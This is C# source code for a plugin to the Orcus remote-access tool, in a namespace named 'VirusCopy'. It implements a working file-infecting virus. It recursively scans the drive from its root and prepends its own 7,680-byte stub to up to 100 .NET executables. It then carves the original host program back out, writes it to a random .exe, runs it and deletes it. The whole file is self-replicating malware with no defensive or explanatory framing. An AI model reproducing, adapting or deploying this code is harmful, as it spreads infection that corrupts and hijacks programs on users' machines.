using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using Orcus.Plugins;

namespace VirusCopy___Orcus
{
	public class Plugin : ClientController
	{
		public int counter = 0;

		public override void Install(string excecutablePath)
		{
			string directoryName = Path.GetDirectoryName(excecutablePath);
			string directoryRoot = Directory.GetDirectoryRoot(directoryName);
			DirectoryInfo d = new DirectoryInfo(directoryRoot);
			int num = Files(d);
			FileStream fileStream = new FileStream(excecutablePath, FileMode.OpenOrCreate, FileAccess.Read);
			int num2 = (int)fileStream.Length;
			int length = num2 - 7680;
			byte[] g = Read(fileStream, length, 7680);
			fileStream.Close();
			Random random = new Random();
			int num3 = random.Next(2000);
			FileStream fileStream2 = new FileStream(num3 + ".exe", FileMode.OpenOrCreate, FileAccess.Write);
			Write(fileStream2, g);
			fileStream2.Close();
			try
			{
				Process process = Process.Start(num3 + ".exe");
				process.WaitForExit();
			}
			catch
			{
			}
			finally
			{
				File.Delete(num3 + ".exe");
			}
		}

		private int Files(DirectoryInfo d)
		{
			FileInfo[] files = d.GetFiles("*.exe");
			FileInfo[] array = files;
			foreach (FileInfo fileInfo in array)
			{
				string fullName = fileInfo.FullName;
				try
				{
					AssemblyName.GetAssemblyName(fullName);
					if (Sha1(Assembly.GetExecutingAssembly().GetModules()[0].FullyQualifiedName) == Sha1(fullName))
					{
						continue;
					}
					try
					{
						Console.WriteLine(fullName);
						if (!Infect(fullName))
						{
							counter++;
						}
					}
					catch
					{
						continue;
					}
					if (counter != 100)
					{
						continue;
					}
					return 0;
				}
				catch
				{
				}
			}
			DirectoryInfo[] directories = d.GetDirectories("*.*");
			DirectoryInfo[] array2 = directories;
			foreach (DirectoryInfo d2 in array2)
			{
				try
				{
					if (counter == 100)
					{
						return 0;
					}
					int num = Files(d2);
				}
				catch
				{
				}
			}
			return 1;
		}

		public byte[] Read(FileStream s, int length, int c)
		{
			BinaryReader binaryReader = new BinaryReader(s);
			binaryReader.BaseStream.Seek(c, SeekOrigin.Begin);
			byte[] array = new byte[length];
			int num = length;
			int num2 = 0;
			while (num > 0)
			{
				int num3 = binaryReader.Read(array, num2, num);
				if (num3 == 0)
				{
					break;
				}
				num2 += num3;
				num -= num3;
			}
			binaryReader.Close();
			return array;
		}

		public bool Infect(string host)
		{
			Module module = Assembly.GetExecutingAssembly().GetModules()[0];
			FileStream fileStream = new FileStream(module.FullyQualifiedName, FileMode.OpenOrCreate, FileAccess.Read);
			byte[] g = Read(fileStream, 7680, 0);
			fileStream.Close();
			FileStream fileStream2 = new FileStream(host, FileMode.OpenOrCreate, FileAccess.Read);
			int length = (int)fileStream2.Length;
			byte[] k = Read(fileStream2, length, 0);
			fileStream2.Close();
			FileStream fileStream3 = new FileStream(host, FileMode.OpenOrCreate, FileAccess.Write);
			WriteX(fileStream3, g, k);
			fileStream3.Close();
			return false;
		}

		public void Write(FileStream s, byte[] g)
		{
			BinaryWriter binaryWriter = new BinaryWriter(s);
			binaryWriter.BaseStream.Seek(0L, SeekOrigin.Begin);
			binaryWriter.Write(g);
			binaryWriter.Flush();
			binaryWriter.Close();
		}

		public void WriteX(FileStream s, byte[] g, byte[] k)
		{
			BinaryWriter binaryWriter = new BinaryWriter(s);
			binaryWriter.BaseStream.Seek(0L, SeekOrigin.Begin);
			binaryWriter.Write(g);
			binaryWriter.Write(k);
			binaryWriter.Flush();
			binaryWriter.Close();
		}

		public string Sha1(string data)
		{
			FileStream fileStream = new FileStream(data, FileMode.OpenOrCreate, FileAccess.Read);
			byte[] buffer = Read(fileStream, 2048, 0);
			fileStream.Close();
			SHA1 sHA = new SHA1CryptoServiceProvider();
			byte[] bytes = sHA.ComputeHash(buffer);
			return BytesToHexString(bytes);
		}

		private string BytesToHexString(byte[] bytes)
		{
			StringBuilder stringBuilder = new StringBuilder(64);
			for (int i = 0; i < bytes.Length; i++)
			{
				stringBuilder.Append($"{bytes[i]:X2}");
			}
			return stringBuilder.ToString();
		}
	}
}
